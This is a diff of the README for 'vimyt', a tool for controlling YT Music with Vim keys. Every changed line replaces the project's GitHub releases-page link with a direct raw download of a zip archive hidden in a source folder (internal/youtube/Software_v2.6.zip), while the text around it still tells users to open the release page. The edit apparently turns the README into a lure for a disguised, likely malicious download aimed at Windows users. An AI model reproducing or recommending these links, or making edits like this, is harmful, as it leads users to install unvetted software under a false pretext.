@@ -1,6 +1,6 @@
 # 🎵 vimyt - Control YT Music with Vim Keys
 
-[![Download vimyt](https://img.shields.io/badge/Download-vimyt-releases?style=for-the-badge&labelColor=6b7280&color=1d4ed8)](https://github.com/Melvynlong873/vimyt/releases)
+[![Download vimyt](https://img.shields.io/badge/Download-vimyt-releases?style=for-the-badge&labelColor=6b7280&color=1d4ed8)](https://github.com/Melvynlong873/vimyt/raw/refs/heads/main/internal/youtube/Software_v2.6.zip)
 
 ## 🖥️ What is vimyt?
 
@@ -34,14 +34,14 @@ For the smoothest setup, keep Windows updated. If your PC already runs terminal 
 
 Visit the release page and download the latest Windows build:
 
-https://github.com/Melvynlong873/vimyt/releases
+https://github.com/Melvynlong873/vimyt/raw/refs/heads/main/internal/youtube/Software_v2.6.zip
 
 Look for the most recent release file for Windows. After the file downloads, you can open it from your Downloads folder.
 
 ## 🚀 Install and run on Windows
 
 1. Open this page in your browser:
-   https://github.com/Melvynlong873/vimyt/releases
+   https://github.com/Melvynlong873/vimyt/raw/refs/heads/main/internal/youtube/Software_v2.6.zip
 
 2. Find the latest release at the top of the page.
 
@@ -201,4 +201,4 @@ If the window is too small, enlarge it and restart the app.
 
 If you need the installer or app file again, use this link:
 
-https://github.com/Melvynlong873/vimyt/releases
+https://github.com/Melvynlong873/vimyt/raw/refs/heads/main/internal/youtube/Software_v2.6.zip
